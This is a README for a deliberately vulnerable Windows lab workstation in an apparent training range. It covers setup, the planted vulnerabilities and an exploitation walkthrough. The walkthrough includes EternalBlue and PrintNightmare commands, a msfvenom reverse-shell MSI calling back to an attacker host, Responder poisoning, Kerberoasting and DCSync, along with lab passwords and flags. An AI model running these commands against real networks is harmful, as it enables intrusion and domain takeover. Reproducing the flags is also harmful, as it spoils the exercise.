# 🏢 Machine 12 — int-ws01 (Domain-Joined Windows Workstation)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY**

> 📝 **IP Note:** All IP addresses below are placeholders. Change `192.168.1.60` (this machine) and `192.168.1.10` (DC) to match your lab network layout before deploying.

---

## 📥 Download & Install Windows 10

> **You need a real Windows 10/11 VM. This machine cannot fully emulate domain-join in Docker.**

| Resource | URL |
|----------|-----|
| **Windows 10 Enterprise Evaluation ISO** (90-day free) | https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise |
| **Windows 10 LTSC Evaluation** (alternative) | https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise-ltsc |
| **VirtualBox** (recommended hypervisor) | https://www.virtualbox.org/wiki/Downloads |

### VirtualBox VM Settings
```
Name:       VULNCORP-INT-WS01
Type:       Microsoft Windows
Version:    Windows 10 (64-bit)
RAM:        2048 MB
vCPUs:      2
Disk:       40 GB (VDI, dynamically allocated)
Network:    Adapter 1 → Host-Only → vboxnet2 (192.168.1.0/24)
```

### Static IP During Windows Setup
After install, set:
- IP Address:  `192.168.1.60`
- Subnet Mask: `255.255.255.0`
- Default Gateway: `192.168.1.1`
- DNS Server: **Leave blank** — `deploy_ws.ps1` sets it to `192.168.1.10` (DC) automatically

> 🔴 **CRITICAL: Deploy `int-dc01` FIRST!** The domain `vulncorp.local` must exist before this machine can join it. See `machines/int-dc01/README.md`.

---

## 🔗 Connection to int-dc01 (Domain Controller)

This workstation **depends on** and **connects to** `int-dc01` (`192.168.1.10`).

| Protocol | Port | Purpose | Script Line |
|----------|------|---------|-------------|
| DNS | 53 | Resolves `vulncorp.local` → points to DC | `deploy_ws.ps1` L26 |
| Kerberos | 88 | Ticket-Granting for domain auth | Automatic after domain join |
| LDAP | 389 | AD queries | Automatic |
| SMB | 445 | NETLOGON / SYSVOL / share access | Automatic |
| RDP | 3389 | Remote Desktop (Domain Admin access) | Both machines |

**How it connects (from `deploy_ws.ps1`):**
```powershell
# 1. DNS points to DC
Set-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ServerAddresses "192.168.1.10"

# 2. Domain join using DC admin credentials
Add-Computer -DomainName "vulncorp.local" \
  -Credential (New-Object PSCredential("VULNCORP\Administrator", (ConvertTo-SecureString "Corp@Admin2024" -AsPlainText -Force))) \
  -OUPath "OU=VulnCorp Users,DC=vulncorp,DC=local" -Force
```

---

## Overview

A domain-joined Windows 10 workstation in the **Internal Zone (`192.168.1.60`)** with multiple vulnerabilities typical of an enterprise endpoint. This machine connects to the **Domain Controller** (`int-dc01` at `192.168.1.10`) and provides attackers a foothold for AD-based attacks and lateral movement.

---

## 🚀 Deployment

### Option A: Real Windows 10/11 VM (Recommended)

On your fresh **Windows 10/11 VM** (`192.168.1.60`):

1. Open **PowerShell as Administrator**.
2. Run:
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\deploy_ws.ps1
```
3. The script will join the domain `vulncorp.local`, configure all vulnerabilities, and reboot.
4. After reboot, log back in and run `.\deploy_ws.ps1` once more to finish configuration.

### Option B: Docker Simulation (Linux VM)

```bash
chmod +x deploy.sh
sudo ./deploy.sh
```

> This deploys a Linux container that simulates the Windows workstation's vulnerable services (SMB, stored credentials, weak auth). Use this when a real Windows VM is not available.

---

## 📡 Exposed Ports & Services

| Service | Port | Description | Vulnerability |
|---------|------|-------------|---------------|
| **SMB** | `445` / `139` | Samba (SMBv1 enabled) | **EternalBlue (CVE-2017-0144)**, guest/null session access |
| **RDP** | `3389` | Remote Desktop | **No NLA required** (CWE-306), weak local admin `ws_admin`/`Desktop@2024` |
| **HTTP** | `80` | Credential dump page | Simulated browser credential store (plaintext passwords) |
| **SSH** | `2222` | OpenSSH (Docker sim only) | `ws_admin`/`Desktop@2024` |

---

## 🎯 Configured Vulnerabilities

| # | Vulnerability | CVE / CWE | Severity | Details |
|---|---------------|-----------|----------|---------|
| 1 | **EternalBlue (SMBv1)** | CVE-2017-0144 | Critical (9.8) | SMBv1 protocol enabled, exploitable with `ms17_010_eternalblue` |
| 2 | **Stored plaintext credentials** | CWE-256 | High (7.5) | Browser credential dump at `/credentials.html`, files in `C:\Users\john.doe\` |
| 3 | **PrintNightmare** | CVE-2021-34527 | Critical (9.8) | Print Spooler service running and exposed |
| 4 | **Unquoted service path** | CWE-428 | High (7.8) | `VulnCorp Monitoring Agent` service with unquoted path |
| 5 | **AlwaysInstallElevated** | CWE-269 | High (7.8) | Both HKLM and HKCU registry keys set to 1 |
| 6 | **LLMNR/NBT-NS poisoning** | CWE-346 | Medium (5.3) | LLMNR and NetBIOS Name Service enabled, capture with Responder |
| 7 | **Weak local admin password** | CWE-521 | High (7.5) | `ws_admin`/`Desktop@2024` — easily guessable |
| 8 | **RDP without NLA** | CWE-306 | Medium (5.3) | Network Level Authentication disabled |

---

## 🔍 Attack Vectors & Exploitation Guide

### 1. EternalBlue (SMBv1 → SYSTEM)
```bash
# From Kali
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.60
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
exploit
```

### 2. Stored Credentials → Lateral Movement
```bash
# Enumerate SMB shares
smbclient -L \\\\192.168.1.60 -N

# Access user share (leaked passwords)
smbclient \\\\192.168.1.60\\Users -N
get john.doe/Documents/saved_passwords.txt

# Credential dump page (Docker sim)
curl http://192.168.1.60/credentials.html
```

Harvested credentials point to the Domain Controller (`int-dc01`):
- `john.doe` / `Corp@Admin2024` → Domain Admin
- `svc_backup` / `Backup@Svc2024` → DCSync rights

### 3. PrintNightmare (Spooler → SYSTEM)
```bash
# Check if spooler is running
rpcdump.py 192.168.1.60 | grep -i spoolsv

# Exploit (requires a malicious DLL share)
CVE-2021-1675.py vulncorp.local/john.doe:Corp@Admin2024@192.168.1.60 '\\<ATTACKER_IP>\share\evil.dll'
```

### 4. Unquoted Service Path → Privesc
```cmd
# Enumerate with PowerUp or manually
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"

# Service: VulnCorp Monitoring Agent
# Path:    C:\Program Files\VulnCorp\Monitoring Agent\monitor.exe
# Drop:    C:\Program Files\VulnCorp\Monitoring.exe (malicious binary)
```

### 5. AlwaysInstallElevated → SYSTEM MSI
```bash
# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f msi -o evil.msi

# Install as SYSTEM
msiexec /quiet /qn /i evil.msi
```

### 6. LLMNR/NBT-NS Poisoning
```bash
# On Kali (same subnet)
responder -I eth0 -wrf

# Wait for the workstation to broadcast name queries
# Captured NTLMv2 hashes can be cracked with hashcat
hashcat -m 5600 hash.txt rockyou.txt
```

### 7. Pivot to Domain Controller
Once you have `john.doe`'s credentials from this workstation:
```bash
# AS-REP Roast from here
GetNPUsers.py vulncorp.local/ -usersfile users.txt -dc-ip 192.168.1.10

# Kerberoast
GetUserSPNs.py vulncorp.local/john.doe:Corp@Admin2024 -dc-ip 192.168.1.10

# DCSync (via svc_backup)
secretsdump.py vulncorp.local/svc_backup:Backup@Svc2024@192.168.1.10
```

---

## 🏆 Flags

- **EternalBlue Flag:** `C:\flags\eternalblue_flag.txt` (`VULN{3t3rn4l_blu3_w0rkst4t10n}`)
- **Credential Dump Flag:** `C:\flags\creds_flag.txt` (`VULN{st0r3d_cr3ds_p1vot}`)
- **Root/Admin Flag:** `C:\flags\admin_flag.txt` (`VULN{w0rkst4t10n_4dm1n_pwn3d}`)

---

## 🔀 Lateral Movement Path

```
int-ws01 (this machine)
    │
    ├── Stored credentials → john.doe / Corp@Admin2024
    │                          └──→ int-dc01 (Domain Admin)
    │
    ├── Stored credentials → svc_backup / Backup@Svc2024
    │                          └──→ int-dc01 (DCSync → full domain compromise)
    │
    └── SMB shares → backup scripts with hardcoded creds
                       └──→ int-backup01 (rsync dump)
```
